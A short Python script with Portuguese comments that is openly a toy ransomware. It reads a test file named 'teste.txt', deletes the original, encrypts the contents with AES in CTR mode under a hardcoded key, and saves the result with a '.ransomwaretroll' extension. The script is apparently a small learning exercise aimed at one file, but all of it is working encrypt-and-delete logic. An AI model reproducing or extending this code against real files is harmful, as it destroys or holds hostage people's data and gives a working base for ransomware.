import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import secrets

# Abrir o arquivo a ser criptografado
file_name = "teste.txt"
with open(file_name, "rb") as file:
    file_data = file.read()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia
key = b"testeransomwares"
nonce = secrets.token_bytes(16)  # Gera um nonce aleatório de 16 bytes

# Configurar o cifrador
cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
cipher_encrypt = cipher.encryptor()
crypto_data = cipher_encrypt.update(file_data) + cipher_encrypt.finalize()

# Salvar o arquivo criptografado (incluindo o nonce no início do arquivo)
with open(file_name + ".ransomwaretroll", "wb") as new_file:
    new_file.write(nonce + crypto_data)
